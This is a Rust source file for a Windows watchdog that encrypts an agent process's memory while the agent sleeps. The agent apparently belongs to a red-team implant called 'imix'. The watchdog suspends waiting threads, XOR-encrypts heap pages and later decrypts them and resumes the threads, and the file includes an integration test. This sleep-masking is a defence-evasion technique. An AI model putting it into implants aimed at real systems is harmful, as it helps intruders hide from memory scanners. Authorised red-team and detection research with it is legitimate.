//! Windows watchdog that drives the memguard encrypt/decrypt dormancy cycle.
//!
//! Gated to `cfg(all(windows, feature = "mem-obfuscation"))`; inert fallbacks
//! for every other target live in `mod.rs` so call sites compile unconditionally.
//!
//! Design (see `/tmp/memguard/phase-2.md` and `design-facts.md`):
//! - A single `std::thread` watchdog is spawned lazily on the first eligible
//!   sleep and lives for the process lifetime, parking on a command channel
//!   between cycles.
//! - The agent task never blocks a tokio worker synchronously: it hands the
//!   watchdog a `std::sync::mpsc` wake channel and parks via
//!   `tokio::task::spawn_blocking(rx.recv())`, then `.await`s the JoinHandle.
//! - Each cycle the watchdog (1) rebuilds the skip set from *live* thread data,
//!   (2) runs the bounded dormancy protocol, (3) encrypts, (4) sleeps the
//!   interval, (5) decrypts, (6) resumes threads, (7) signals the agent.
//! - During the encrypted window the watchdog must not touch the (now
//!   PAGE_NOACCESS) process heap, so all per-cycle working state lives on its
//!   stack or in the engine's pre-allocated state region, and the
//!   `print_debug` log lines are emitted through a non-allocating writer.

use core::ffi::c_void;
use std::sync::OnceLock;
use std::sync::mpsc::{Receiver, Sender, channel};
use std::thread;

use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
};
use windows_sys::Win32::System::Memory::{MEMORY_BASIC_INFORMATION, VirtualQuery};
use windows_sys::Win32::System::Threading::{
    GetCurrentProcessId, GetCurrentThread, GetCurrentThreadId, OpenThread, ResumeThread, Sleep,
    SuspendThread, THREAD_GET_CONTEXT, THREAD_QUERY_INFORMATION, THREAD_SUSPEND_RESUME,
};

use crate::memguard::MemGuard;

pub const MIN_ENCRYPT_INTERVAL_SECS: f64 = 10.0;
const RSP_HOT_WINDOW_PAGES: usize = 16;
const WAIT_STUB_LEN: usize = 0x18;
const MAX_STUBS: usize = 8;
const DORMANCY_MAX_ATTEMPTS: usize = 5;
const DORMANCY_BACKOFF_MS: u64 = 5;
const PAGE_SIZE: usize = 4096;
const TLS_EXPANSION_SLOTS_OFFSET: usize = 0x1780;
const CONTEXT_CONTROL: u32 = 0x1;
const THREAD_BASIC_INFORMATION_CLASS: u32 = 0;
const THREAD_STATE_CLASS: u32 = 0x20;
const THREAD_STATE_WAITING: u32 = 5;
const MAX_THREADS: usize = 1024;

type NtQueryInformationThreadFn =
    extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;

unsafe extern "system" {
    fn GetModuleHandleW(lpModuleName: *const u16) -> *mut c_void;
    fn GetProcAddress(hModule: *mut c_void, lpProcName: *const u8) -> *mut c_void;
    fn WriteFile(
        hFile: *mut c_void,
        lpBuffer: *const c_void,
        nNumberOfBytesToWrite: u32,
        lpNumberOfBytesWritten: *mut u32,
        lpOverlapped: *mut c_void,
    ) -> i32;
    fn GetThreadContext(hThread: *mut c_void, lpContext: *mut CONTEXT) -> i32;
}

// Raw x64 CONTEXT (CONTEXT_CONTROL subset). The layout is stable across Windows
// x64; we only set ContextFlags = CONTEXT_CONTROL and read Rip / Rsp.
#[repr(C)]
#[allow(non_snake_case, dead_code)]
struct CONTEXT {
    P1Home: u64,
    P2Home: u64,
    P3Home: u64,
    P4Home: u64,
    P5Home: u64,
    P6Home: u64,
    ContextFlags: u32,
    MxCsr: u32,
    SegCs: u16,
    SegDs: u16,
    SegEs: u16,
    SegFs: u16,
    SegGs: u16,
    SegSs: u16,
    EFlags: u32,
    Dr0: u64,
    Dr1: u64,
    Dr2: u64,
    Dr3: u64,
    Dr6: u64,
    Dr7: u64,
    Rax: u64,
    Rcx: u64,
    Rdx: u64,
    Rbx: u64,
    Rsp: u64,
    Rbp: u64,
    Rsi: u64,
    Rdi: u64,
    R8: u64,
    R9: u64,
    R10: u64,
    R11: u64,
    R12: u64,
    R13: u64,
    R14: u64,
    R15: u64,
    Rip: u64,
}

#[repr(C)]
struct ThreadBasicInformation {
    exit_status: i32,
    teb_base: *mut c_void,
    unique_process: *mut c_void,
    unique_thread: *mut c_void,
    affinity_mask: usize,
    priority: i32,
    base_priority: i32,
}

#[derive(Clone, Copy, Default)]
struct ThreadSlot {
    handle: *mut c_void,
    tid: u32,
    teb: *mut c_void,
    stack_base: *mut c_void,
    stack_limit: *mut c_void,
    rsp: u64,
    suspended: bool,
}

// RAII guard: resumes any still-suspended threads and closes opened handles when
// the per-cycle slot buffer leaves scope (including early returns).
struct SlotsGuard<'a> {
    slots: &'a mut [ThreadSlot],
}

impl<'a> Drop for SlotsGuard<'a> {
    fn drop(&mut self) {
        for s in self.slots.iter_mut() {
            if s.suspended {
                unsafe { ResumeThread(s.handle) };
                s.suspended = false;
            }
            if !s.handle.is_null() {
                unsafe { CloseHandle(s.handle) };
                s.handle = core::ptr::null_mut();
            }
        }
    }
}

struct WatchdogCommand {
    wake_tx: Sender<()>,
    interval_secs: f64,
}

struct WaitStubs {
    items: [(usize, usize); MAX_STUBS],
    count: usize,
}

struct CycleOutcome {
    pages: usize,
    skipped: bool,
}

static WATCHDOG_CMD: OnceLock<Option<Sender<WatchdogCommand>>> = OnceLock::new();

/// Minimum effective sleep (seconds) required before the watchdog encrypt path
/// engages. Overridable at watchdog init via `IMIX_MEMGUARD_MIN_SECS`.
pub fn min_encrypt_interval_secs() -> f64 {
    static CACHED: OnceLock<f64> = OnceLock::new();
    *CACHED.get_or_init(|| {
        std::env::var("IMIX_MEMGUARD_MIN_SECS")
            .ok()
            .and_then(|s| s.parse::<f64>().ok())
            .filter(|v| v.is_finite() && *v >= 0.0)
            .unwrap_or(MIN_ENCRYPT_INTERVAL_SECS)
    })
}

/// Engage the watchdog for one sleep cycle. Returns `true` once the cycle (which
/// may have been an unencrypted fail-safe) has completed and the agent has been
/// woken, `false` only when the watchdog could not be started (so the caller
/// should fall back to `tokio::time::sleep`).
pub async fn engage_memguard_sleep(interval_secs: f64) -> bool {
    let tx = match ensure_watchdog() {
        Some(tx) => tx,
        None => return false,
    };
    let (wake_tx, wake_rx) = channel::<()>();
    if tx
        .send(WatchdogCommand {
            wake_tx,
            interval_secs,
        })
        .is_err()
    {
        // Watchdog channel is gone; fall back to the normal sleep path.
        return false;
    }
    // Park the async worker on a blocking-pool thread so the runtime stays free
    // while the watchdog owns the encrypt/sleep/decrypt window.
    let _ = tokio::task::spawn_blocking(move || wake_rx.recv()).await;
    true
}

fn ensure_watchdog() -> Option<&'static Sender<WatchdogCommand>> {
    let slot = WATCHDOG_CMD.get_or_init(|| {
        let (cmd_tx, cmd_rx) = channel::<WatchdogCommand>();
        let wait_stubs = resolve_wait_stubs();
        match thread::Builder::new()
            .name("imix-memguard".into())
            .stack_size(8 * 1024 * 1024)
            .spawn(move || watchdog_main(cmd_rx, wait_stubs))
        {
            Ok(_handle) => Some(cmd_tx),
            Err(_) => None,
        }
    });
    slot.as_ref()
}

fn watchdog_main(cmd_rx: Receiver<WatchdogCommand>, wait_stubs: WaitStubs) {
    let ntqit = resolve_ntquery();
    let mut guard: Option<MemGuard> = MemGuard::new();

    while let Ok(cmd) = cmd_rx.recv() {
        let ntqit = match ntqit {
            Some(f) => f,
            None => {
                plain_sleep(cmd.interval_secs);
                let _ = cmd.wake_tx.send(());
                continue;
            }
        };
        let g = match guard.as_mut() {
            Some(g) => g,
            None => {
                plain_sleep(cmd.interval_secs);
                let _ = cmd.wake_tx.send(());
                continue;
            }
        };
        let _ = run_cycle(
            g,
            ntqit,
            &wait_stubs.items[..wait_stubs.count],
            cmd.interval_secs,
        );
        let _ = cmd.wake_tx.send(());
    }
}

fn plain_sleep(secs: f64) {
    if secs > 0.0 {
        let ms = (secs * 1000.0) as u64;
        if ms <= u32::MAX as u64 {
            unsafe { Sleep(ms as u32) };
        }
    }
}

fn resolve_ntquery() -> Option<NtQueryInformationThreadFn> {
    unsafe {
        let ntdll = GetModuleHandleW(wstr("ntdll.dll").as_ptr());
        if ntdll.is_null() {
            return None;
        }
        let p = GetProcAddress(ntdll, b"NtQueryInformationThread\0".as_ptr());
        if p.is_null() {
            return None;
        }
        Some(core::mem::transmute(p))
    }
}

fn resolve_wait_stubs() -> WaitStubs {
    let names: &[&[u8]] = &[
        b"NtWaitForSingleObject\0",
        b"NtWaitForAlertByThreadId\0",
        b"NtRemoveIoCompletion\0",
        b"NtDelayExecution\0",
        b"NtWaitForMultipleObjects\0",
        b"SleepConditionVariableSRW\0",
        b"WaitForSingleObjectEx\0",
    ];
    let m0 = wstr("ntdll.dll");
    let m1 = wstr("kernel32.dll");
    let m2 = wstr("kernelbase.dll");
    let modules: &[&[u16]] = &[m0.as_slice(), m1.as_slice(), m2.as_slice()];
    let mut stubs = WaitStubs {
        items: [(0usize, 0usize); MAX_STUBS],
        count: 0,
    };
    unsafe {
        for name in names {
            if stubs.count >= MAX_STUBS {
                break;
            }
            let mut resolved: *mut c_void = core::ptr::null_mut();
            for m in modules {
                let h = GetModuleHandleW(m.as_ptr());
                if !h.is_null() {
                    let p = GetProcAddress(h, name.as_ptr());
                    if !p.is_null() {
                        resolved = p;
                        break;
                    }
                }
            }
            if !resolved.is_null() {
                let start = resolved as usize;
                stubs.items[stubs.count] = (start, start + WAIT_STUB_LEN);
                stubs.count += 1;
            }
        }
    }
    stubs
}

fn wstr(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn region_size_of(ptr: *mut c_void) -> usize {
    let mut mbi = core::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::uninit();
    let ret = unsafe {
        VirtualQuery(
            ptr,
            mbi.as_mut_ptr(),
            core::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
        )
    };
    if ret == 0 {
        0
    } else {
        unsafe { mbi.assume_init().RegionSize }
    }
}

fn rip_in_wait_stub(rip: u64, stubs: &[(usize, usize)]) -> bool {
    let r = rip as usize;
    stubs.iter().any(|(s, e)| r >= *s && r < *e)
}

fn sleep_backoff(attempt: usize) {
    let ms = (DORMANCY_BACKOFF_MS * (attempt as u64 + 1)).min(64);
    unsafe { Sleep(ms as u32) };
}

fn thread_state(ntqit: NtQueryInformationThreadFn, handle: *mut c_void) -> Option<u32> {
    let mut state: u32 = 0;
    let status = ntqit(
        handle,
        THREAD_STATE_CLASS,
        &mut state as *mut u32 as *mut c_void,
        4,
        core::ptr::null_mut(),
    );
    if status >= 0 { Some(state) } else { None }
}

// Enumerate the current process's threads (excluding the watchdog TID) into a
// stack buffer. Returns the live count, or `None` on any failure that prevents a
// safe dormancy pass (we then skip the cycle rather than encrypt around a thread
// we could not account for).
fn enumerate_threads(
    self_tid: u32,
    ntqit: NtQueryInformationThreadFn,
    buf: &mut [ThreadSlot],
) -> Option<usize> {
    let pid = unsafe { GetCurrentProcessId() };
    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snap == INVALID_HANDLE_VALUE {
        return None;
    }
    let mut te: THREADENTRY32 = unsafe { core::mem::zeroed() };
    te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut count = 0usize;
    let mut first = true;
    loop {
        let ok = if first {
            first = false;
            unsafe { Thread32First(snap, &mut te) != 0 }
        } else {
            unsafe { Thread32Next(snap, &mut te) != 0 }
        };
        if !ok {
            break;
        }
        if te.th32OwnerProcessID != pid || te.th32ThreadID == self_tid {
            continue;
        }
        if count >= buf.len() {
            unsafe { CloseHandle(snap) };
            return None;
        }
        let handle = unsafe {
            OpenThread(
                THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION,
                0,
                te.th32ThreadID,
            )
        };
        if handle.is_null() {
            unsafe { CloseHandle(snap) };
            for s in &mut buf[..count] {
                unsafe { CloseHandle(s.handle) };
                s.handle = core::ptr::null_mut();
            }
            return None;
        }
        let (teb, stack_base, stack_limit) = read_teb(ntqit, handle);
        buf[count] = ThreadSlot {
            handle,
            tid: te.th32ThreadID,
            teb,
            stack_base,
            stack_limit,
            rsp: 0,
            suspended: false,
        };
        count += 1;
    }
    unsafe { CloseHandle(snap) };
    Some(count)
}

fn read_teb(
    ntqit: NtQueryInformationThreadFn,
    handle: *mut c_void,
) -> (*mut c_void, *mut c_void, *mut c_void) {
    let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
    let status = ntqit(
        handle,
        THREAD_BASIC_INFORMATION_CLASS,
        tbi.as_mut_ptr() as *mut c_void,
        core::mem::size_of::<ThreadBasicInformation>() as u32,
        core::ptr::null_mut(),
    );
    if status < 0 {
        return (
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );
    }
    let teb = unsafe { tbi.assume_init().teb_base };
    if teb.is_null() {
        return (
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        );
    }
    unsafe {
        let stack_base = *(teb.add(0x08) as *const *mut c_void);
        let stack_limit = *(teb.add(0x10) as *const *mut c_void);
        (teb, stack_base, stack_limit)
    }
}

fn add_thread_state_exclusions(guard: &mut MemGuard, slots: &[ThreadSlot]) -> bool {
    for s in slots {
        if s.teb.is_null() {
            continue;
        }
        let teb_size = region_size_of(s.teb);
        if teb_size > 0 && !guard.add_exclusion(s.teb as *const u8, teb_size) {
            return false;
        }
        unsafe {
            let peb = *(s.teb.add(0x60) as *const *mut c_void);
            if !peb.is_null() {
                let peb_size = region_size_of(peb);
                if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
                    return false;
                }
            }
            let tls = *(s.teb.add(0x58) as *const *mut c_void);
            if !tls.is_null() {
                let page = (tls as usize & !(PAGE_SIZE - 1)) as *const u8;
                if !guard.add_exclusion(page, PAGE_SIZE) {
                    return false;
                }
            }
            let tls_exp = *(s.teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
            if !tls_exp.is_null() {
                let tls_exp_size = region_size_of(tls_exp);
                if tls_exp_size > 0 && !guard.add_exclusion(tls_exp as *const u8, tls_exp_size) {
                    return false;
                }
            }
        }
    }
    true
}

// Exclude the watchdog's own thread-local state and entire stack. The watchdog
// is Running while it owns the encrypted window, so its TEB/PEB/TLS and stack
// must stay in the unencrypted set or it would fault on its own state.
fn add_watchdog_exclusions(guard: &mut MemGuard, ntqit: NtQueryInformationThreadFn) -> bool {
    let cur = unsafe { GetCurrentThread() };
    let mut tbi = core::mem::MaybeUninit::<ThreadBasicInformation>::uninit();
    let status = ntqit(
        cur,
        THREAD_BASIC_INFORMATION_CLASS,
        tbi.as_mut_ptr() as *mut c_void,
        core::mem::size_of::<ThreadBasicInformation>() as u32,
        core::ptr::null_mut(),
    );
    if status < 0 {
        return false;
    }
    let teb = unsafe { tbi.assume_init().teb_base };
    if teb.is_null() {
        return false;
    }
    unsafe {
        let teb_size = region_size_of(teb);
        if teb_size > 0 && !guard.add_exclusion(teb as *const u8, teb_size) {
            return false;
        }
        let peb = *(teb.add(0x60) as *const *mut c_void);
        if !peb.is_null() {
            let peb_size = region_size_of(peb);
            if peb_size > 0 && !guard.add_exclusion(peb as *const u8, peb_size) {
                return false;
            }
        }
        let tls = *(teb.add(0x58) as *const *mut c_void);
        if !tls.is_null() {
            let page = (tls as usize & !(PAGE_SIZE - 1)) as *const u8;
            if !guard.add_exclusion(page, PAGE_SIZE) {
                return false;
            }
        }
        let tls_exp = *(teb.add(TLS_EXPANSION_SLOTS_OFFSET) as *const *mut c_void);
        if !tls_exp.is_null() {
            let tls_exp_size = region_size_of(tls_exp);
            if tls_exp_size > 0 && !guard.add_exclusion(tls_exp as *const u8, tls_exp_size) {
                return false;
            }
        }
        let stack_base = *(teb.add(0x08) as *const *mut c_void);
        let stack_limit = *(teb.add(0x10) as *const *mut c_void);
        if !stack_base.is_null()
            && !stack_limit.is_null()
            && stack_base as usize > stack_limit as usize
        {
            if !guard.add_exclusion(
                stack_limit as *const u8,
                stack_base as usize - stack_limit as usize,
            ) {
                return false;
            }
        }
    }
    true
}

fn add_rsp_window_exclusion(guard: &mut MemGuard, s: &ThreadSlot) -> bool {
    if s.stack_base.is_null() || s.stack_limit.is_null() {
        // No stack bounds known: exclude the whole stack to be safe rather than
        // leave it partially encrypted around an unknown Rsp.
        return true;
    }
    let base = s.stack_limit as usize;
    let top = s.stack_base as usize;
    let rsp = s.rsp as usize;
    if rsp < base || rsp > top {
        return guard.add_exclusion(s.stack_limit as *const u8, top - base);
    }
    let window = RSP_HOT_WINDOW_PAGES * PAGE_SIZE;
    let mut lo = rsp.saturating_sub(window);
    let mut hi = rsp + window;
    if lo < base {
        lo = base;
    }
    if hi > top {
        hi = top;
    }
    if hi <= lo {
        return true;
    }
    guard.add_exclusion(lo as *const u8, hi - lo)
}

enum DormancyResult {
    Ok,
    RetryExhausted,
    Fail,
}

// Bounded dormancy protocol. Suspends every non-watchdog thread that is
// currently Waiting and re-verifies each one is frozen inside a known ntdll /
// kernel wait stub (Rip captured via GetThreadContext). On success the RSP hot
// window for each suspended thread is added to the engine's skip set.
fn run_dormancy(
    guard: &mut MemGuard,
    ntqit: NtQueryInformationThreadFn,
    slots: &mut [ThreadSlot],
    stubs: &[(usize, usize)],
) -> DormancyResult {
    for attempt in 0..DORMANCY_MAX_ATTEMPTS {
        // Pre-check: every candidate thread must report ThreadState == Waiting.
        let mut all_waiting = true;
        for s in slots.iter_mut() {
            s.suspended = false;
            if thread_state(ntqit, s.handle) != Some(THREAD_STATE_WAITING) {
                all_waiting = false;
                break;
            }
        }
        if !all_waiting {
            sleep_backoff(attempt);
            continue;
        }

        // Suspend every candidate. Previous suspend count must be 0 (we must not
        // disturb a thread already suspended by a debugger).
        let mut suspend_ok = true;
        for s in slots.iter_mut() {
            let prev = unsafe { SuspendThread(s.handle) };
            if prev == u32::MAX {
                suspend_ok = false;
                break;
            }
            if prev != 0 {
                // Already suspended by someone else; restore it and bail.
                unsafe { ResumeThread(s.handle) };
                suspend_ok = false;
                break;
            }
            s.suspended = true;
        }
        if !suspend_ok {
            resume_all(slots);
            sleep_backoff(attempt);
            continue;
        }

        // Re-verify: each suspended thread must be frozen at a wait-stub Rip.
        let mut verify_ok = true;
        for s in slots.iter_mut() {
            let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
            ctx.ContextFlags = CONTEXT_CONTROL;
            let ok = unsafe { GetThreadContext(s.handle, &mut ctx) } != 0;
            if !ok || !rip_in_wait_stub(ctx.Rip, stubs) {
                verify_ok = false;
                break;
            }
            s.rsp = ctx.Rsp;
        }
        if !verify_ok {
            resume_all(slots);
            sleep_backoff(attempt);
            continue;
        }

        // All dormant: add the RSP hot window for each suspended thread.
        for s in slots.iter() {
            if !add_rsp_window_exclusion(guard, s) {
                resume_all(slots);
                return DormancyResult::Fail;
            }
        }
        return DormancyResult::Ok;
    }
    DormancyResult::RetryExhausted
}

fn resume_all(slots: &mut [ThreadSlot]) {
    for s in slots.iter_mut() {
        if s.suspended {
            unsafe { ResumeThread(s.handle) };
            s.suspended = false;
        }
    }
}

fn run_cycle(
    guard: &mut MemGuard,
    ntqit: NtQueryInformationThreadFn,
    stubs: &[(usize, usize)],
    interval_secs: f64,
) -> CycleOutcome {
    guard.clear_dynamic_exclusions();
    let self_tid = unsafe { GetCurrentThreadId() };

    let mut slot_buf = [ThreadSlot::default(); MAX_THREADS];
    let n = match enumerate_threads(self_tid, ntqit, &mut slot_buf) {
        Some(n) => n,
        None => {
            emit_skip("thread enumeration failed");
            plain_sleep(interval_secs);
            return CycleOutcome {
                pages: 0,
                skipped: true,
            };
        }
    };
    let slots = SlotsGuard {
        slots: &mut slot_buf[..n],
    };

    if !add_thread_state_exclusions(guard, slots.slots) {
        emit_skip("exclusion capacity");
        plain_sleep(interval_secs);
        return CycleOutcome {
            pages: 0,
            skipped: true,
        };
    }
    if !add_watchdog_exclusions(guard, ntqit) {
        emit_skip("exclusion capacity");
        plain_sleep(interval_secs);
        return CycleOutcome {
            pages: 0,
            skipped: true,
        };
    }

    match run_dormancy(guard, ntqit, slots.slots, stubs) {
        DormancyResult::Ok => {}
        DormancyResult::RetryExhausted => {
            emit_skip("running threads");
            plain_sleep(interval_secs);
            return CycleOutcome {
                pages: 0,
                skipped: true,
            };
        }
        DormancyResult::Fail => {
            emit_skip("dormancy failed");
            plain_sleep(interval_secs);
            return CycleOutcome {
                pages: 0,
                skipped: true,
            };
        }
    }

    if !guard.encrypt() {
        // Encrypt failed mid-pass: restore whatever was already XOR'd, then
        // resume. Fail-safe is an unencrypted cycle, never a corrupted process.
        emit_skip("encrypt failed");
        let _ = guard.decrypt();
        plain_sleep(interval_secs);
        return CycleOutcome {
            pages: 0,
            skipped: true,
        };
    }

    let pages = guard.encrypted_count();
    let dormant = slots.slots.iter().filter(|s| s.suspended).count();
    emit_engage(dormant, pages, interval_secs);

    plain_sleep(interval_secs);

    // Decrypt is resumable; retry on a transient VirtualProtect failure.
    for _ in 0..DORMANCY_MAX_ATTEMPTS {
        if guard.decrypt() {
            break;
        }
    }

    let resumed = slots.slots.iter().filter(|s| s.suspended).count();
    emit_wake(pages, resumed);
    // `slots` drops here: resumes any still-suspended threads and closes handles.
    CycleOutcome {
        pages,
        skipped: false,
    }
}

// ---------------------------------------------------------------------------
// Non-allocating `print_debug` output. During the encrypted window the process
// heap is PAGE_NOACCESS, so a normal `println!`/`log::info!` (which allocate)
// would fault. These lines are written straight to stdout via WriteFile using a
// stack buffer.
// ---------------------------------------------------------------------------

#[cfg(feature = "print_debug")]
struct StackBuf {
    buf: [u8; 160],
    len: usize,
}

#[cfg(feature = "print_debug")]
impl core::fmt::Write for StackBuf {
    fn write_str(&mut self, s: &str) -> core::fmt::Result {
        let b = s.as_bytes();
        let space = self.buf.len() - self.len;
        let take = b.len().min(space);
        self.buf[self.len..self.len + take].copy_from_slice(&b[..take]);
        self.len += take;
        Ok(())
    }
}

#[cfg(feature = "print_debug")]
fn fmt_secs(buf: &mut StackBuf, secs: f64) {
    let cs = (secs * 100.0) as i64;
    let whole = cs / 100;
    let frac = (cs % 100).unsigned_abs();
    let _ = core::fmt::write(buf, format_args!("{whole}.{frac:02}"));
}

#[cfg(feature = "print_debug")]
fn dbg_print(b: &StackBuf) {
    use windows_sys::Win32::System::Console::{GetStdHandle, STD_OUTPUT_HANDLE};
    let h = unsafe { GetStdHandle(STD_OUTPUT_HANDLE) };
    if (h as usize) == usize::MAX {
        return;
    }
    let mut written = 0u32;
    unsafe {
        let _ = WriteFile(
            h,
            b.buf.as_ptr() as *const c_void,
            b.len as u32,
            &mut written,
            core::ptr::null_mut(),
        );
    }
}

#[cfg(feature = "print_debug")]
fn emit_engage(dormant: usize, pages: usize, interval: f64) {
    let mut b = StackBuf {
        buf: [0u8; 160],
        len: 0,
    };
    let _ = core::fmt::write(
        &mut b,
        format_args!(
            "memguard engage: dormant_threads={dormant} pages_encrypted={pages} interval="
        ),
    );
    fmt_secs(&mut b, interval);
    let _ = core::fmt::write(&mut b, format_args!("s\n"));
    dbg_print(&b);
}

#[cfg(feature = "print_debug")]
fn emit_skip(reason: &str) {
    let mut b = StackBuf {
        buf: [0u8; 160],
        len: 0,
    };
    let _ = core::fmt::write(&mut b, format_args!("memguard skip: {reason}\n"));
    dbg_print(&b);
}

#[cfg(feature = "print_debug")]
fn emit_wake(pages: usize, resumed: usize) {
    let mut b = StackBuf {
        buf: [0u8; 160],
        len: 0,
    };
    let _ = core::fmt::write(
        &mut b,
        format_args!("memguard wake: pages_decrypted={pages} resumed={resumed}\n"),
    );
    dbg_print(&b);
}

#[cfg(not(feature = "print_debug"))]
fn emit_engage(_dormant: usize, _pages: usize, _interval: f64) {}

#[cfg(not(feature = "print_debug"))]
fn emit_skip(_reason: &str) {}

#[cfg(not(feature = "print_debug"))]
fn emit_wake(_pages: usize, _resumed: usize) {}

// ---------------------------------------------------------------------------
// Windows-gated integration test: one full dormancy + encrypt + decrypt +
// resume cycle against real memory, with a parked thread that must wake.
// Runs on Windows CI / the Phase 4 host.
// ---------------------------------------------------------------------------

#[cfg(all(windows, feature = "mem-obfuscation", test))]
mod tests {
    use super::*;
    use std::sync::mpsc;
    use std::time::Duration;

    #[test]
    fn windows_dormancy_cycle() {
        // Serialize with the engine's round-trip test which also creates the
        // MemGuard singleton.
        let _g = crate::memguard::TEST_LOCK.lock().unwrap();

        let (tx, rx) = mpsc::channel::<()>();
        // Park in a kernel wait so the dormancy protocol can verify a known
        // wait-stub Rip (std mpsc recv parks via a condvar on Windows).
        let parked = std::thread::spawn(move || {
            let _ = rx.recv();
        });

        let ntqit = resolve_ntquery().expect("NtQueryInformationThread unavailable");
        let stubs = resolve_wait_stubs();
        let mut guard = MemGuard::new().expect("memguard init");

        let outcome = run_cycle(&mut guard, ntqit, &stubs.items[..stubs.count], 0.0);
        assert!(
            !outcome.skipped,
            "dormancy cycle should encrypt, not skip (parked thread not seen as dormant?)"
        );
        assert!(outcome.pages > 0, "cycle should have encrypted pages");
        assert_eq!(
            guard.encrypted_count(),
            0,
            "all pages should be decrypted after the cycle"
        );

        // Wake and join the parked thread.
        let _ = tx.send(());
        parked.join().expect("parked thread joined");
        // Give the joined thread a moment; not strictly required.
        let _ = Duration::from_millis(0);
    }
}
